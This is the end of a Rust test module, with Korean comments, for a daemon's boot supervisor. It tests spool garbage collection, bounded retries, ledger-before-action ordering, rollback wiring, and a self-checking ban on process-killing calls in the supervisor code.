    /// 정렬 앞쪽을 살아있는 인텐트로 가득 채우고(`a###`), 뒤쪽에 파싱 불가 쓰레기를 둔다
    /// (`z###`). 판정 상한(64) 안쪽만 GC 대상이면 뒤쪽은 **영원히** 지워지지 않는다 =
    /// 스풀 무한 성장. 쓰레기 수를 GC 상한보다 크게 잡아 **회전 커서**가 없으면 초록이
    /// 될 수 없게 만든다(상한을 키우는 것만으로는 이 검체를 통과할 수 없다).
    #[test]
    fn gc_is_not_starved_by_the_judgement_cap() {
        let d = tmp_daemon("gcstarve");
        let dir = tmp_spool("gcstarve");
        for i in 0..MAX_SCAN_ENTRIES {
            enqueue_in(
                &dir,
                &format!("a{i:03}"),
                BootAction::EnsureTeam,
                "",
                None,
                "t",
                0.0,
            )
            .unwrap();
        }
        const GARBAGE: usize = 400; // > MAX_GC_ENTRIES — 상한만 키우는 수리는 통과 못 한다.
        for i in 0..GARBAGE {
            raw_intent(&dir, &format!("z{i:03}"), "{ broken");
        }
        let mut st = SupState::default();
        let mut now = 1.0;
        for _ in 0..20 {
            tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, now);
            now += 5.0;
        }
        let left = std::fs::read_dir(&dir)
            .unwrap()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_name().to_string_lossy().starts_with('z'))
            .count();
        assert_eq!(
            left, 0,
            "판정 상한 뒤쪽 쓰레기 {left}건이 GC 되지 않았다 — 스풀이 무한 성장한다"
        );
    }

    /// ★**성공했는데 파일이 지워지지 않는** 경우에도 낳는 프로세스와 이벤트는 유계다.
    ///
    /// 삭제 실패의 가장 나쁜 형태는 GC 축이 아니라 **성공 축**이다: 성공 후 인텐트가 남으면
    /// 다음 틱이 같은 인텐트를 다시 실행한다. 여기서 유계를 세우는 것은 예산 두 축이고,
    /// 마지막 `attempts_exhausted` 폐기 이벤트도 음성 캐시가 1건으로 접는다.
    #[test]
    fn successful_dispatch_with_undeletable_intent_is_still_bounded() {
        let d = tmp_daemon("okundeletable");
        let dir = tmp_spool("okundeletable");
        enqueue_in(&dir, "s", BootAction::EnsureTeam, "", None, "t", 0.0).unwrap();
        let mut st = SupState::default();
        let before = d.bus.latest_seq();
        let mut total = 0usize;
        let mut now = 1.0;
        for _ in 0..200 {
            total += tick_in(&d, &dir, &mut st, ok_runner, never_removes, now);
            now += 5.0; // 쿨다운을 계속 넘겨 준다 — 그래도 유계여야 한다.
        }
        assert_eq!(
            total, MAX_ATTEMPTS as usize,
            "지워지지 않는 인텐트가 성공 경로에서 {total}회 프로세스를 낳았다(폭주)"
        );
        // 원장 1건/디스패치 + dispatched 3 + intent_retired 1 = 7 을 넘지 않는다.
        let published = d.bus.latest_seq() - before;
        assert!(
            published <= 7,
            "200틱 동안 이벤트 {published}건 — 삭제 실패가 발행을 영구화했다"
        );
    }

    /// 제거자의 성공 정의 — "이제 이 경로에 파일이 없다"(남이 먼저 지운 경우 포함).
    #[test]
    fn remover_reports_absence_as_success() {
        let dir = tmp_spool("remover");
        let p = dir.join("gone.json");
        assert!(remove_spool_file(&p), "이미 없는 경로는 성공이어야 한다");
        std::fs::write(&p, "x").unwrap();
        assert!(remove_spool_file(&p), "평범한 파일 삭제 실패");
        assert!(!p.exists());
    }

    // ── 소스 핀(관례: governance.rs `queue_delivery_single_helper_shared_by_tick_and_rpc`) ──

    /// 프로덕션 슬라이스에서 `//` 줄주석을 **제거**한다.
    ///
    /// 왜 필요한가: 아래 금칙어 핀은 "이 코드가 무엇을 **부르는가**"를 보는 장치인데, 주석은
    /// 부르는 것이 아니라 설명하는 것이다. 주석 한 줄로 핀이 적색이 되면 다음 사람은 핀을
    /// 완화하거나 설명을 지운다 — 둘 다 나쁘다. 반대로 주석 한 줄로 핀이 **초록**이 되는 일도
    /// 없어야 한다(그쪽이 더 위험하다). 그래서 판정 대상에서 주석을 통째로 뺀다.
    /// (문자열 리터럴 안의 `//` 까지 다루는 완전한 렉서가 아니다 — 이 파일에는 그런 리터럴이
    ///  없고, 생기면 아래 핀들이 곧바로 적색으로 알려 준다.)
    fn strip_line_comments(src: &str) -> String {
        src.lines()
            .map(|l| match l.find("//") {
                Some(i) => &l[..i],
                None => l,
            })
            .collect::<Vec<_>>()
            .join("\n")
    }

    /// ★불변식 — **원장 기록이 행위보다 앞**이다(`dispatch_one` 안에서 순서 역전 금지).
    #[test]
    fn ledger_record_precedes_the_action() {
        let src = include_str!("boot_supervisor.rs");
        let raw = &src[..src.find("#[cfg(test)]").expect("테스트 모듈 앵커 소실")];
        let prod = strip_line_comments(raw);
        let prod = prod.as_str();
        let at = prod.find("fn dispatch_one(").expect("dispatch_one 소실");
        let body = &prod[at..];
        let rec = body.find("record_audited(").expect("감독자 원장 기록 지점 소실");
        let run = body.find("runner(daemon").expect("실행자 호출 지점 소실");
        assert!(
            rec < run,
            "원장 기록이 행위 뒤로 갔다 — 그 창에서 임무 게이트가 기계 push 를 오너 임무로 오인한다"
        );
        assert_eq!(
            prod.matches("crate::delivery::Origin::Supervisor").count(),
            1,
            "감독자 원장 유래 지정 지점은 정확히 1곳이어야 한다(구현 갈라짐 차단)"
        );
    }

    /// 파괴/재기동 어휘 — 감독자 코드에 **한 글자도** 있으면 안 되는 호출들.
    const DESTRUCTIVE: [&str; 7] = [
        "close_surface",
        "kill_on_drop(true)",
        "check_agent_death",
        "launch_via_cli",
        "restart_counts",
        "reap_",
        ".kill(",
    ];

    /// 금칙어 탐지기(주석 제거 후 판정). 반환 = 적발된 어휘 목록.
    fn destructive_hits(src_slice: &str) -> Vec<&'static str> {
        let code = strip_line_comments(src_slice);
        DESTRUCTIVE
            .iter()
            .copied()
            .filter(|w| code.contains(w))
            .collect()
    }

    /// ★롤백 스위치가 **실제 배선**이다 — `spawn` 이 판정을 먼저 하고 태스크 전에 빠져나간다.
    /// (순수 코어만 맞고 배선이 없으면 노브를 눌러도 감독자가 뜬다 = 롤백 사문.)
    #[test]
    fn rollback_switch_is_wired_before_the_task_is_spawned() {
        let src = include_str!("boot_supervisor.rs");
        let raw = &src[..src.find("#[cfg(test)]").expect("테스트 모듈 앵커 소실")];
        let prod = strip_line_comments(raw);
        let at = prod.find("pub fn spawn(").expect("spawn 소실");
        let body = &prod[at..];
        let judge = body.find("supervisor_off_from(").expect("롤백 판정 호출 소실");
        let ret = body.find("        return;").expect("조기 return(=미기동) 소실");
        let task = body.find("tokio::spawn(").expect("태스크 기동 지점 소실");
        assert!(
            judge < ret && ret < task,
            "롤백 판정이 태스크 기동보다 뒤다 — 노브를 눌러도 감독자가 뜬다(롤백 사문)"
        );
        // env 판독은 이 1지점뿐이다(축별 1지점 규약 — 판독 지점이 늘면 조합이 갈린다).
        assert_eq!(
            prod.matches("supervisor_off_from(").count(),
            2,
            "롤백 판정의 정의 1 + 호출 1 이어야 한다(판독 지점 산재 금지)"
        );
    }

    /// ★오살 금지 — 감독자는 **살아 있는 것을 죽이는 어떤 호출도** 하지 않는다.
    /// (설계서가 요구한 '예산 Daemon 필드 승격' 이 파일 반경 밖이라, 그 공유가 필요한 상황
    ///  자체를 만들지 않는 것으로 안전을 확보한다 — `Budget` 타입 주석 참조.)
    ///
    /// ★계측 타당성: 트리에 위반이 0 이면 탐지기가 고장나도 초록이다. 그래서 **합성 표본**으로
    /// 탐지 능력 자체를 함께 시험한다 — 금칙 호출을 코드에 심은 변조본에서 반드시 적발돼야 하고,
    /// 같은 문장을 **주석에** 넣은 변조본에서는 적발되지 않아야 한다(주석은 호출이 아니다).
    #[test]
    fn supervisor_never_kills_anything() {
        let src = include_str!("boot_supervisor.rs");
        let raw = &src[..src.find("#[cfg(test)]").expect("테스트 모듈 앵커 소실")];
        let hits = destructive_hits(raw);
        assert!(
            hits.is_empty(),
            "감독자에 파괴/재기동 경로가 들어왔다: {hits:?} — 오살이 오탐보다 훨씬 위험하다"
        );
        // 합성 표본 ① — 코드에 심으면 반드시 적발된다(탐지기 생존 증명).
        for w in DESTRUCTIVE {
            let mutant = format!("{raw}\nfn __mutant() {{ let _ = {w}; }}\n");
            assert_eq!(
                destructive_hits(&mutant),
                vec![w],
                "합성 변조본에서 금칙 호출 {w:?} 를 적발하지 못했다 = 탐지기 고장"
            );
        }
        // 합성 표본 ② — 주석에 있는 같은 문장은 적발하지 않는다(핀이 설명을 죽이지 않는다).
        let commented = format!("{raw}\n// 여기서 close_surface 를 부르면 안 된다\n");
        assert!(
            destructive_hits(&commented).is_empty(),
            "주석 문장을 위반으로 읽었다 — 다음 사람이 설명을 지우거나 핀을 완화하게 된다"
        );
    }
}
